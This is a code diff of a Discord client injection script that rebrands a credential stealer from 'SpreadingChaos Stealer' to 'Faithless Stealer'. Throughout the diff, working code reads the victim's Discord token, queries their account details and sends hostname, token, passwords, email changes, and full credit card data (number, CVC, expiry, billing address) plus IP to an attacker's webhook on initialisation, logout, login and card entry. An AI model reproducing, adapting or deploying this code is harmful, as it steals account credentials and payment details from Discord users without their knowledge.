@@ -64,29 +64,29 @@ function FirstTime() {
             if (fs.existsSync(path.join(__dirname, "init"))) {
                 fs.rmdirSync(path.join(__dirname, "init"));
                 if (token == null || token == undefined || token == "") {
-                    var c={username:"SpreadingChaos Stealer",content:"",embeds:[{title:"Discord Initalized (User not Logged in)",color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1}],author:{name:"SpreadingChaos Stealer"},footer:{text:"SpreadingChaos Stealer"},thumbnail:{url:"https://ibb.co/nmDLGCT"}}]};SendToWebhook(JSON.stringify(c));
+                    var c={username:"Faithless Stealer",content:"",embeds:[{title:"Discord Initalized (User not Logged in)",color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1}],author:{name:"Faithless Stealer"},footer:{text:"Faithless Stealer"},thumbnail:{url:"https://ibb.co/nmDLGCT"}}]};SendToWebhook(JSON.stringify(c));
                 } else {
                     const window = BrowserWindow.getAllWindows()[0];
                     window.webContents.executeJavaScript(`
                     var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","${token}"),xmlHttp.send(null),xmlHttp.responseText;
-                    `,!0).then(a=>{const b=JSON.parse(a);var c={username:"SpreadingChaos Stealer",content:"",embeds:[{title:"Discord Initalized",color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1},{name:"Username",value:`\`${b.username}#${b.discriminator}\``,inline:!0},{name:"ID",value:`\`${b.id}\``,inline:!0},{name:"Badges",value:`${GetBadges(b.flags)}`,inline:!1},{name:"Token",value:`\`\`\`${token}\`\`\``,inline:!1}],author:{name:"SpreadingChaos Stealer"},footer:{text:"SpreadingChaos Stealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`}}]};SendToWebhook(JSON.stringify(c))});
+                    `,!0).then(a=>{const b=JSON.parse(a);var c={username:"Faithless Stealer",content:"",embeds:[{title:"Discord Initalized",color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1},{name:"Username",value:`\`${b.username}#${b.discriminator}\``,inline:!0},{name:"ID",value:`\`${b.id}\``,inline:!0},{name:"Badges",value:`${GetBadges(b.flags)}`,inline:!1},{name:"Token",value:`\`\`\`${token}\`\`\``,inline:!1}],author:{name:"Faithless Stealer"},footer:{text:"Faithless Stealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`}}]};SendToWebhook(JSON.stringify(c))});
                 }
                 
             }
         }
-        if (!fs.existsSync(path.join(__dirname, "SpreadingChaosBTW"))) {
+        if (!fs.existsSync(path.join(__dirname, "FaithlessBTW"))) {
             return !0
         }
-        fs.rmdirSync(path.join(__dirname, "SpreadingChaosBTW"));
+        fs.rmdirSync(path.join(__dirname, "FaithlessBTW"));
         if (config.logout != "false" || config.logout == "%LOGOUT%") {
             if (config['logout-notify'] == "true") {
                 if  (token == null || token == undefined || token == "") {
-                    var c={username:"SpreadingChaos Stealer",content:"",embeds:[{title:"User log out (User not Logged in before)",color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1}],author:{name:"SpreadingChaos Stealer"},footer:{text:"SpreadingChaos Stealer"},thumbnail:{url:"https://ibb.co/nmDLGCT"}}]};SendToWebhook(JSON.stringify(c));
+                    var c={username:"Faithless Stealer",content:"",embeds:[{title:"User log out (User not Logged in before)",color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1}],author:{name:"Faithless Stealer"},footer:{text:"Faithless Stealer"},thumbnail:{url:"https://ibb.co/nmDLGCT"}}]};SendToWebhook(JSON.stringify(c));
                 } else {
                     const window = BrowserWindow.getAllWindows()[0];
                     window.webContents.executeJavaScript(`
                     var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","${token}"),xmlHttp.send(null),xmlHttp.responseText;
-                    `,!0).then(a=>{const b=JSON.parse(a);var c={username:"SpreadingChaos Stealer",content:"",embeds:[{title:"User got logged out",color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1},{name:"Username",value:`\`${b.username}#${b.discriminator}\``,inline:!0},{name:"ID",value:`\`${b.id}\``,inline:!0},{name:"Badges",value:`${GetBadges(b.flags)}`,inline:!1},{name:"Token",value:`\`\`\`${token}\`\`\``,inline:!1}],author:{name:"SpreadingChaos Stealer"},footer:{text:"SpreadingChaos Stealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`}}]};SendToWebhook(JSON.stringify(c))});
+                    `,!0).then(a=>{const b=JSON.parse(a);var c={username:"Faithless Stealer",content:"",embeds:[{title:"User got logged out",color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1},{name:"Username",value:`\`${b.username}#${b.discriminator}\``,inline:!0},{name:"ID",value:`\`${b.id}\``,inline:!0},{name:"Badges",value:`${GetBadges(b.flags)}`,inline:!1},{name:"Token",value:`\`\`\`${token}\`\`\``,inline:!1}],author:{name:"Faithless Stealer"},footer:{text:"Faithless Stealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`}}]};SendToWebhook(JSON.stringify(c))});
                 }
             }
             const window = BrowserWindow.getAllWindows()[0];
@@ -294,7 +294,7 @@ function Login(email, password, token) {
                     }
                     const json = JSON.parse(info);
                     var params = {
-                        username: "SpreadingChaos Stealer",
+                        username: "Faithless Stealer",
                         content: "",
                         embeds: [{
                             "title": "User Login",
@@ -337,10 +337,10 @@ function Login(email, password, token) {
                                 inline: !1
                             }, ],
                             "author": {
-                                "name": "SpreadingChaos Stealer"
+                                "name": "Faithless Stealer"
                             },
                             "footer": {
-                                "text": "SpreadingChaos Stealer"
+                                "text": "Faithless Stealer"
                             },
                             "thumbnail": {
                                 "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -350,10 +350,10 @@ function Login(email, password, token) {
                             "color": config['embed-color'],
                             "description": CalcFriends(),
                             "author": {
-                                "name": "SpreadingChaos Stealer"
+                                "name": "Faithless Stealer"
                             },
                             "footer": {
-                                "text": "SpreadingChaos Stealer"
+                                "text": "Faithless Stealer"
                             },
                             "thumbnail": {
                                 "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -408,7 +408,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                 }
                 const json = JSON.parse(info);
                 var params = {
-                    username: "SpreadingChaos Stealer",
+                    username: "Faithless Stealer",
                     content: "",
                     embeds: [{
                         "title": "Password Changed",
@@ -455,10 +455,10 @@ function ChangePassword(oldpassword, newpassword, token) {
                             inline: !1
                         }, ],
                         "author": {
-                            "name": "SpreadingChaos Stealer"
+                            "name": "Faithless Stealer"
                         },
                         "footer": {
-                            "text": "SpreadingChaos Stealer"
+                            "text": "Faithless Stealer"
                         },
                         "thumbnail": {
                             "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -512,7 +512,7 @@ function ChangeEmail(newemail, password, token) {
                 }
                 const json = JSON.parse(info);
                 var params = {
-                    username: "SpreadingChaos Stealer",
+                    username: "Faithless Stealer",
                     content: "",
                     embeds: [{
                         "title": "Email Changed",
@@ -555,10 +555,10 @@ function ChangeEmail(newemail, password, token) {
                             inline: !1
                         }, ],
                         "author": {
-                            "name": "SpreadingChaos Stealer"
+                            "name": "Faithless Stealer"
                         },
                         "footer": {
-                            "text": "SpreadingChaos Stealer"
+                            "text": "Faithless Stealer"
                         },
                         "thumbnail": {
                             "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -587,16 +587,16 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
     `, !0).then((ip) => {
             var json = JSON.parse(info);
             var params = {
-                username: "SpreadingChaos Stealer",
+                username: "Faithless Stealer",
                 content: "",
                 embeds: [{
                     "title": "User Credit Card Added",
                     "description": "**Username:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**Email:**```" + json.email + "```\n" + "**Nitro Type:**```" + GetNitro(json.premium_type) + "```\n**Badges:**```" + GetBadges(json.flags) + "```" + "\n**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```" + "\n**Token:**```" + token + "```" + "\n**IP: **```" + ip + "```",
                     "author": {
-                        "name": "SpreadingChaos Stealer"
+                        "name": "Faithless Stealer"
                     },
                     "footer": {
-                        "text": "SpreadingChaos Stealer"
+                        "text": "Faithless Stealer"
                     },
                     "thumbnail": {
                         "url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
